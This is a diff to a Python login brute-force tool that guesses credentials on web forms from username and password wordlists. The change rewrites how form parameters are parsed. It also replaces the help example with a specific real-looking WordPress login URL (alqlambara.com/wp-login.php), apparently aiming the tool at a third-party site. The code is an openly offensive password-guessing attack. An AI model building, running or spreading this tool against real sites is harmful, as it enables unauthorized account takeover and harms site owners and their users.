@@ -1,8 +1,6 @@
 import argparse
-
-
+from argon2 import Parameters
 import attack
-
 
 class LoginBrute:
 
@@ -32,7 +30,7 @@ class LoginBrute:
         parser.add_argument('-p', '--passList', type=str, help='specify the wordlist for the password')
         parser.add_argument('-d', '--data', type=str,
                             help='specify the parameters, '
-                                 'Ex: username=User@password=pwd@submit=yes@action=/userinfo.php@method=post')
+                                 'Ex: username=log@password=pwd@submit=submit@action=https://alqlambara.com/wp-login.php@method=post')
         parser.add_argument('-l', '--url', type=str, help='specify the url to the form', required=True)
         parser.add_argument('-t', '--failTxt', type=str, help='provide a text that appears when login fails')
 
@@ -50,13 +48,13 @@ class LoginBrute:
             try:
                 pass_list = open(pass_list, 'rb').readlines()
             except IOError as e:
-                print(fg('red') + 'File' + pass_list + ' not found')
+                print('File' + pass_list + ' not found')
 
         if user_list:
             try:
                 user_list = open(user_list, 'rb').readlines()
             except IOError as e:
-                print(fg('red') + 'File' + user_list + 'not found')
+                print('File' + user_list + 'not found')
 
         if not user_list and not username:
             username = 'test'
@@ -69,29 +67,24 @@ class LoginBrute:
                 print(self.error + 'invalid html parameters input\n')
                 exit(1)
             try:
-                params = data.split('@')
+                user_param, password_param, submit, action, method = data.split('@')
+                print(user_param,password_param,submit,method,action)
+                i = user_param.rfind('=')
+                user_param = user_param[i+1:len(user_param)]
+                i = password_param.rfind('=') + 1
+                password_param = password_param[i:len(password_param)]
+                i = submit.rfind('=') + 1
+                submit = submit[i:len(submit)]
+                i = action.rfind('=') + 1
+                action = action[i:len(action)]
+                i = method.rfind('=') + 1
+                method = method[i:len(method)]
             except IOError as e:
                 print(self.error + 'invalid html parameters input\n')
                 exit(1)
-            for param in params:
-                i = param.rfind('=')
-                p = param[i+1]
-                if 'username' in param:
-                    user_param = p
-                elif 'password' in param:
-                    password_param = p
-                elif 'submit' in param:
-                    submit = p
-                elif 'action' in param:
-                    action = p
-                elif 'method' in param:
-                    method = p
-
         else:
             import params_scraper
             user_param, password_param, submit, action, method = params_scraper.get_source(url)
-        print(user_param,password_param,submit,method,action)
-
 
         if 'http' not in action:
             i = url.rfind('/')
